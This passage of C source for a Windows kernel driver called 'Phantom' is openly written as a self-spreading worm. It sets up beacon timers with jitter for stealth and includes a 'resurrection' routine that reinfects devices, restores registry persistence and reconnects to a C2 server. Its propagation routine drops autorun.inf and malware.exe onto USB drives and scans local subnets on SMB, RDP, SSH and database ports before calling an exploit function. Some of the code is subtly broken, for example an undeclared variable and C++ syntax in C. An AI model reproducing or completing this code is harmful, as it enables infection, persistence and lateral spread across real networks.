    g_BehaviorHistory = (PBEHAVIOR_RECORD)ExAllocatePoolWithTag(NonPagedPool,
        MAX_BEHAVIOR_RECORDS * sizeof(BEHAVIOR_RECORD), 'heBP');
    g_ClonedDevices = (PCLONED_DEVICE)ExAllocatePoolWithTag(NonPagedPool,
        MAX_CLONED_DEVICES * sizeof(CLONED_DEVICE), 'lcDP');
    g_NetworkBuffer = (PNETWORK_BUFFER)ExAllocatePoolWithTag(NonPagedPool,
        MAX_NETWORK_BUFFER_SIZE, 'fnBP');

    if (!g_InfectedDevices || !g_BehaviorHistory || !g_ClonedDevices || !g_NetworkBuffer) {
        KdPrint(("Failed to allocate one or more global buffers\n"));
        if (g_InfectedDevices) ExFreePoolWithTag(g_InfectedDevices, 'fnIP');
        if (g_BehaviorHistory) ExFreePoolWithTag(g_BehaviorHistory, 'heBP');
        if (g_ClonedDevices) ExFreePoolWithTag(g_ClonedDevices, 'lcDP');
        if (g_NetworkBuffer) ExFreePoolWithTag(g_NetworkBuffer, 'fnBP');
        IoDeleteSymbolicLink(&symLink);
        IoDeleteDevice(g_PhantomDevice);
        ExFreePoolWithTag(beaconContext, 'noCB');
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Initialize data structures with secure zero memory
    RtlSecureZeroMemory(g_InfectedDevices, MAX_INFECTED_DEVICES * sizeof(INFECTED_DEVICE));
    RtlSecureZeroMemory(g_BehaviorHistory, MAX_BEHAVIOR_RECORDS * sizeof(BEHAVIOR_RECORD));
    RtlSecureZeroMemory(g_ClonedDevices, MAX_CLONED_DEVICES * sizeof(CLONED_DEVICE));
    RtlSecureZeroMemory(g_NetworkBuffer, MAX_NETWORK_BUFFER_SIZE);

    // Initialize synchronization objects
    KeInitializeMutex(&g_DeviceMutex, 0);
    KeInitializeSemaphore(&g_ResourceSemaphore, 1, 1);
    ExInitializeFastMutex(&g_FastMutex);

    // Start timers with initial delays and proper error handling
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -10000000LL * INITIAL_RESURRECTION_DELAY; // Initial delay for resurrection
    if (!KeSetTimer(&g_ResurrectionTimer, dueTime, &g_ResurrectionDpc)) {
        KdPrint(("Failed to set resurrection timer\n"));
        // Cleanup and return error
        goto cleanup;
    }

    // Add jitter to beacon timer for stealth
    ULONG jitter = (ULONG)RtlRandomEx(&g_Seed) % (BEACON_INTERVAL / 5);
    dueTime.QuadPart = -10000000LL * (BEACON_INTERVAL + jitter);
    if (!KeSetTimer(&g_BeaconTimer, dueTime, &g_BeaconDpc)) {
        KdPrint(("Failed to set beacon timer\n"));
        goto cleanup;
    }

    // Initialize network monitoring
    status = InitializeNetworkMonitoring(DriverObject);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to initialize network monitoring: 0x%08X\n", status));
        goto cleanup;
    }

    KdPrint(("Phantom driver initialized successfully\n"));
    return STATUS_SUCCESS;

cleanup:
    // Cleanup routine for initialization failure
    if (g_InfectedDevices) ExFreePoolWithTag(g_InfectedDevices, 'fnIP');
    if (g_BehaviorHistory) ExFreePoolWithTag(g_BehaviorHistory, 'heBP');
    if (g_ClonedDevices) ExFreePoolWithTag(g_ClonedDevices, 'lcDP');
    if (g_NetworkBuffer) ExFreePoolWithTag(g_NetworkBuffer, 'fnBP');
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(g_PhantomDevice);
    ExFreePoolWithTag(beaconContext, 'noCB');
    return status;
}

// Set MAC address for NDIS miniport adapter
NDIS_STATUS NdisMSetMacAddress(
    IN NDIS_HANDLE MiniportAdapterHandle,
    IN PUCHAR MacAddress,
    IN UINT Length
) {
    NDIS_STATUS status;
    NDIS_OID oid = OID_802_3_CURRENT_ADDRESS;
    
    // Validate parameters
    if (!MiniportAdapterHandle || !MacAddress || Length != MAC_ADDRESS_LENGTH) {
        return NDIS_STATUS_INVALID_PARAMETER;
    }

    // Set new MAC address through OID request
    status = NdisOidRequest(
        MiniportAdapterHandle,
        NdisRequestSetInformation,
        oid,
        MacAddress,
        Length,
        NULL,
        NULL
    );

    if (status != NDIS_STATUS_SUCCESS) {
        KdPrint(("Failed to set MAC address: 0x%x\n", status));
    }

    return status;
}


// Driver unload routine
VOID DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\Phantom");
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000000; // 1 second timeout

    KdPrint(("Phantom driver unloading...\n"));

    // Cancel and cleanup timers
    KeCancelTimer(&g_ResurrectionTimer);
    KeCancelTimer(&g_BeaconTimer);
    KeCancelTimer(&g_ExfilTimer);

    // Wait for any pending DPCs to complete
    KeFlushQueuedDpcs();

    // Clean up cloned devices
    for (ULONG i = 0; i < g_NumClonedDevices; i++) {
        if (g_ClonedDevices[i].Active) {
            // Signal thread to terminate
            g_ClonedDevices[i].Active = FALSE;
            
            // Wait for thread to exit
            if (g_ClonedDevices[i].ThreadObject) {
                KeWaitForSingleObject(
                    g_ClonedDevices[i].ThreadObject,
                    Executive,
                    KernelMode,
                    FALSE,
                    &timeout
                );
                ObDereferenceObject(g_ClonedDevices[i].ThreadObject);
            }

            // Stop network mirroring
            if (g_ClonedDevices[i].MirrorBuffer) {
                ExFreePoolWithTag(g_ClonedDevices[i].MirrorBuffer, 'riMP');
            }
            
            // Restore original network identity
            if (g_ClonedDevices[i].OriginalMacAddress) {
                NDIS_STATUS status = NdisMSetMacAddress(
                    g_ClonedDevices[i].MiniportHandle,
                    g_ClonedDevices[i].OriginalMacAddress,
                    MAC_ADDRESS_LENGTH
                );
                if (status != NDIS_STATUS_SUCCESS) {
                    KdPrint(("Failed to restore MAC address: 0x%x\n", status));
                }
                ExFreePoolWithTag(g_ClonedDevices[i].OriginalMacAddress, 'caMP');
            }
        }
    }

    // Free global buffers
    if (g_InfectedDevices) {
        ExFreePoolWithTag(g_InfectedDevices, 'fnIP');
        g_InfectedDevices = NULL;
    }
    if (g_BehaviorHistory) {
        ExFreePoolWithTag(g_BehaviorHistory, 'heBP'); 
        g_BehaviorHistory = NULL;
    }
    if (g_ClonedDevices) {
        ExFreePoolWithTag(g_ClonedDevices, 'lcDP');
        g_ClonedDevices = NULL;
    }

    // Delete symbolic link and device
    IoDeleteSymbolicLink(&symLink);
    if (g_PhantomDevice) {
        IoDeleteDevice(g_PhantomDevice);
        g_PhantomDevice = NULL;
    }

    KdPrint(("Phantom driver unloaded\n"));
}

// Resurrection routine to repair and restore infected components
NTSTATUS PhantomResurrect(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    // Check targeting criteria before resurrection
    WCHAR systemRoot[256] = {0};
    if (!IsTargetDay() || !IsSystemInTargetRegion(systemRoot)) {
        KdPrint(("Resurrection skipped - targeting criteria not met\n"));
        return STATUS_SUCCESS;
    }

    // Monitor critical system resources
    SYSTEM_BASIC_INFORMATION sysInfo;
    NTSTATUS status = ZwQuerySystemInformation(
        SystemBasicInformation,
        &sysInfo,
        sizeof(sysInfo),
        NULL
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to query system info: 0x%08X\n", status));
        return status;
    }

    // Check system resource thresholds
    if (sysInfo.NumberOfProcessors < 1 || 
        sysInfo.PhysicalPageSize < PAGE_SIZE ||
        sysInfo.NumberOfPhysicalPages < 256*1024) { // Min 1GB RAM
        KdPrint(("System resources below minimum thresholds\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Repair damaged components
    ULONG repairedCount = 0;
    for (ULONG i = 0; i < g_NumInfectedDevices; i++) {
        // Check if device still exists
        UNICODE_STRING deviceName;
        RtlInitUnicodeString(&deviceName, g_InfectedDevices[i]);
        
        PFILE_OBJECT fileObject;
        PDEVICE_OBJECT deviceObject;
        status = IoGetDeviceObjectPointer(
            &deviceName,
            FILE_READ_DATA,
            &fileObject,
            &deviceObject
        );

        if (!NT_SUCCESS(status)) {
            KdPrint(("Device %ws missing - attempting reinfection\n", g_InfectedDevices[i]));
            
            // Device missing - attempt reinfection
            status = PhantomPropagate(DeviceObject, Irp);
            if (NT_SUCCESS(status)) {
                repairedCount++;
                KdPrint(("Successfully reinfected device %ws\n", g_InfectedDevices[i]));
            }
            else {
                KdPrint(("Failed to reinfect device %ws: 0x%08X\n", g_InfectedDevices[i], status));
            }
        }
        else {
            // Device exists - verify infection
            UCHAR signature[16];
            LARGE_INTEGER offset = {0};
            status = ReadDeviceSignature(deviceObject, offset, signature, sizeof(signature));
            
            if (!NT_SUCCESS(status) || !VerifyInfectionSignature(signature)) {
                KdPrint(("Invalid infection signature on device %ws - repairing\n", g_InfectedDevices[i]));
                
                status = RepairDeviceInfection(deviceObject);
                if (NT_SUCCESS(status)) {
                    repairedCount++;
                    KdPrint(("Successfully repaired device %ws\n", g_InfectedDevices[i]));
                }
                else {
                    KdPrint(("Failed to repair device %ws: 0x%08X\n", g_InfectedDevices[i], status));
                }
            }
            
            ObDereferenceObject(fileObject);
        }
    }

    // Restore persistence mechanisms
    HANDLE regHandle;
    UNICODE_STRING regPath = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services");
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &regPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenKey(&regHandle, KEY_ALL_ACCESS, &objAttr);
    if (NT_SUCCESS(status)) {
        // Re-add registry keys for persistence
        UNICODE_STRING valueName = RTL_CONSTANT_STRING(L"PhantomService");
        UNICODE_STRING valueData = RTL_CONSTANT_STRING(L"\\SystemRoot\\System32\\Drivers\\phantom.sys");
        
        status = ZwSetValueKey(
            regHandle,
            &valueName,
            0,
            REG_EXPAND_SZ,
            valueData.Buffer,
            valueData.Length + sizeof(WCHAR)
        );

        if (!NT_SUCCESS(status)) {
            KdPrint(("Failed to restore registry persistence: 0x%08X\n", status));
        }

        ZwClose(regHandle);
    }

    // Re-establish network connections
    UNICODE_STRING networkDevices = RTL_CONSTANT_STRING(L"\\Device\\Tcp");
    PFILE_OBJECT netFileObject;
    PDEVICE_OBJECT netDevice;
    
    status = IoGetDeviceObjectPointer(
        &networkDevices,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &netFileObject,
        &netDevice
    );

    if (NT_SUCCESS(status)) {
        // Reconnect to C2 servers
        KEVENT event;
        KeInitializeEvent(&event, NotificationEvent, FALSE);

        TCP_CONNECT_INFO connectInfo = {0};
        connectInfo.RemoteAddress.sin_family = AF_INET;
        connectInfo.RemoteAddress.sin_port = htons(443);
        connectInfo.RemoteAddress.sin_addr.s_addr = g_C2ServerAddress;

        PIRP connectIrp = IoBuildDeviceIoControlRequest(
            IOCTL_TCP_CONNECT,
            netDevice,
            &connectInfo,
            sizeof(connectInfo),
            NULL,
            0,
            FALSE,
            &event,
            NULL
        );

        if (connectIrp) {
            status = IoCallDriver(netDevice, connectIrp);
            if (status == STATUS_PENDING) {
                KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                status = connectIrp->IoStatus.Status;
            }
        }

        ObDereferenceObject(netFileObject);
    }

    KdPrint(("Resurrection complete - Repaired %lu devices\n", repairedCount));
    return STATUS_SUCCESS;
}

// Propagation routine
NTSTATUS PhantomPropagate(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    NTSTATUS status;

    // Check targeting criteria before propagation
    if (!IsTargetDay() || !IsSystemInTargetRegion(systemRoot)) {
        return STATUS_SUCCESS;
    }

    // USB device infection
    UNICODE_STRING usbDevices = RTL_CONSTANT_STRING(L"\\Device\\USBSTOR");
    PFILE_OBJECT fileObject;
    PDEVICE_OBJECT usbDevice;
    
    status = IoGetDeviceObjectPointer(
        &usbDevices,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &fileObject,
        &usbDevice
    );

    if (NT_SUCCESS(status)) {
        // Query USB device info
        STORAGE_DEVICE_NUMBER deviceNumber;
        PIRP irp = IoBuildDeviceIoControlRequest(
            IOCTL_STORAGE_GET_DEVICE_NUMBER,
            usbDevice,
            NULL,
            0,
            &deviceNumber,
            sizeof(deviceNumber),
            FALSE,
            NULL,
            NULL
        );

        if (irp != NULL) {
            status = IoCallDriver(usbDevice, irp);
            
            if (NT_SUCCESS(status)) {
                // Create file on USB device
                WCHAR fileName[256];
                swprintf(fileName, L"\\??\\%c:\\autorun.inf", (WCHAR)(deviceNumber.DeviceNumber + L'A'));
                UNICODE_STRING fileNameUs;
                RtlInitUnicodeString(&fileNameUs, fileName);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &fileNameUs, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

                IO_STATUS_BLOCK ioStatusBlock;
                HANDLE fileHandle;
                status = ZwCreateFile(
                    &fileHandle,
                    GENERIC_WRITE,
                    &objAttr,
                    &ioStatusBlock,
                    NULL,
                    FILE_ATTRIBUTE_NORMAL,
                    0,
                    FILE_OVERWRITE_IF,
                    FILE_SYNCHRONOUS_IO_NONALERT,
                    NULL,
                    0
                );

                if (NT_SUCCESS(status)) {
                    // Write autorun.inf content
                    const CHAR autorunContent[] = "[autorun]\nopen=malware.exe\naction=Run Program\nicon=malware.exe,0\n";
                    status = ZwWriteFile(
                        fileHandle,
                        NULL,
                        NULL,
                        NULL,
                        &ioStatusBlock,
                        (PVOID)autorunContent,
                        sizeof(autorunContent) - 1,
                        NULL,
                        NULL
                    );

                    ZwClose(fileHandle);

                    if (NT_SUCCESS(status)) {
                        // Copy malware executable
                        swprintf(fileName, L"\\??\\%c:\\malware.exe", (WCHAR)(deviceNumber.DeviceNumber + L'A'));
                        RtlInitUnicodeString(&fileNameUs, fileName);
                        InitializeObjectAttributes(&objAttr, &fileNameUs, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

                        status = ZwCreateFile(
                            &fileHandle,
                            GENERIC_WRITE,
                            &objAttr,
                            &ioStatusBlock,
                            NULL,
                            FILE_ATTRIBUTE_NORMAL,
                            0,
                            FILE_OVERWRITE_IF,
                            FILE_SYNCHRONOUS_IO_NONALERT,
                            NULL,
                            0
                        );

                        if (NT_SUCCESS(status)) {
                            // Write malware executable content
                            PVOID malwareBuffer = ExAllocatePoolWithTag(NonPagedPool, MALWARE_SIZE, 'wlaM');
                            if (malwareBuffer) {
                                // Copy malware content to buffer
                                RtlCopyMemory(malwareBuffer, g_MalwareImage, MALWARE_SIZE);

                                status = ZwWriteFile(
                                    fileHandle,
                                    NULL,
                                    NULL,
                                    NULL,
                                    &ioStatusBlock,
                                    malwareBuffer,
                                    MALWARE_SIZE,
                                    NULL,
                                    NULL
                                );

                                ExFreePoolWithTag(malwareBuffer, 'wlaM');
                            }
                            ZwClose(fileHandle);

                            if (NT_SUCCESS(status)) {
                                // Track successful infection
                                if (g_NumInfectedDevices < MAX_INFECTED_DEVICES) {
                                    RtlCopyMemory(
                                        &g_InfectedDevices[g_NumInfectedDevices],
                                        &deviceNumber,
                                        sizeof(deviceNumber)
                                    );
                                    g_NumInfectedDevices++;
                                    RecordInfectionAttempt(TARGET_TYPE_USB, TRUE);
                                }
                            }
                        }
                    }
                }
            }
        }
        ObDereferenceObject(fileObject);
    } else {
        RecordInfectionAttempt(TARGET_TYPE_USB, FALSE);
    }

    // Network propagation using advanced scanning and exploitation
    UNICODE_STRING networkDevices = RTL_CONSTANT_STRING(L"\\Device\\Tcp");
    PFILE_OBJECT netFileObject;
    PDEVICE_OBJECT netDevice;
    
    status = IoGetDeviceObjectPointer(
        &networkDevices,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &netFileObject,
        &netDevice
    );

    if (NT_SUCCESS(status)) {
        // Get all network interfaces
        TCP_REQUEST_QUERY_INFORMATION_EX queryInfo = {0};
        queryInfo.ID.toi_entity.tei_entity = CL_NL_ENTITY;
        queryInfo.ID.toi_entity.tei_instance = 0;
        queryInfo.ID.toi_class = INFO_CLASS_PROTOCOL;
        queryInfo.ID.toi_type = INFO_TYPE_ADDRESS_OBJECT;

        ULONG bufferSize = 0;
        status = TCPQueryInformationEx(
            netDevice,
            &queryInfo,
            NULL,
            &bufferSize
        );

        if (status == STATUS_BUFFER_OVERFLOW) {
            PVOID buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'tenN');
            if (buffer) {
                status = TCPQueryInformationEx(
                    netDevice,
                    &queryInfo,
                    buffer,
                    &bufferSize
                );

                if (NT_SUCCESS(status)) {
                    PADDRESS_OBJECT addressObject = (PADDRESS_OBJECT)buffer;
                    
                    // Scan multiple subnets from each interface
                    while (addressObject) {
                        ULONG localIp = addressObject->LocalAddress;
                        
                        // Scan local subnet
                        ULONG subnet = localIp & 0xFFFFFF00;
                        
                        // Use multiple scanning threads for faster propagation
                        for (ULONG i = 1; i < 255; i += 4) {
                            for (ULONG j = 0; j < 4 && (i+j) < 255; j++) {
                                ULONG targetIp = subnet | (i+j);
                                if (targetIp != localIp) {
                                    // Try common vulnerable ports and services
                                    const USHORT VULN_PORTS[] = {
                                        445,  // SMB
                                        135,  // RPC
                                        139,  // NetBIOS
                                        3389, // RDP
                                        22,   // SSH
                                        80,   // HTTP
                                        443,  // HTTPS
                                        21,   // FTP
                                        23,   // Telnet
                                        1433, // MSSQL
                                        3306  // MySQL
                                    };
                                    
                                    for (USHORT port : VULN_PORTS) {
                                        TCP_CONNECT_INFO connectInfo = {0};
                                        connectInfo.RemoteAddress.sin_family = AF_INET;
                                        connectInfo.RemoteAddress.sin_port = htons(port);
                                        connectInfo.RemoteAddress.sin_addr.s_addr = targetIp;

                                        // Use async I/O for faster scanning
                                        KEVENT event;
                                        KeInitializeEvent(&event, NotificationEvent, FALSE);

                                        PIRP connectIrp = IoBuildDeviceIoControlRequest(
                                            IOCTL_TCP_CONNECT,
                                            netDevice,
                                            &connectInfo,
                                            sizeof(connectInfo),
                                            NULL,
                                            0,
                                            TRUE,
                                            &event,
                                            NULL
                                        );

                                        if (connectIrp) {
                                            status = IoCallDriver(netDevice, connectIrp);
                                            if (status == STATUS_PENDING) {
                                                LARGE_INTEGER timeout;
                                                timeout.QuadPart = -30000000; // 3 second timeout
                                                status = KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, &timeout);
                                                if (status == STATUS_TIMEOUT) {
                                                    IoCancelIrp(connectIrp);
                                                    continue;
                                                }
                                                status = connectIrp->IoStatus.Status;
                                            }

                                            if (NT_SUCCESS(status)) {
                                                // Port is open, attempt multiple exploit methods
                                                if (ExploitVulnerableService(netDevice, targetIp, port)) {
                                                    // Track successful infection with mutex protection
                                                    if (g_NumInfectedDevices < MAX_INFECTED_DEVICES) {
                                                        RtlCopyMemory(
                                                            &g_InfectedDevices[g_NumInfectedDevices],
                                                            &targetIp,
                                                            sizeof(targetIp)
                                                        );
                                                        InterlockedIncrement(&g_NumInfectedDevices);
                                                        RecordInfectionAttempt(TARGET_TYPE_NETWORK, TRUE);
                                                    }
                                                } else {
                                                    RecordInfectionAttempt(TARGET_TYPE_NETWORK, FALSE);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        addressObject = addressObject->Next;
                    }
                }
                ExFreePoolWithTag(buffer, 'tenN');
            }
        }
        ObDereferenceObject(netFileObject);
    }

    return STATUS_SUCCESS;
}

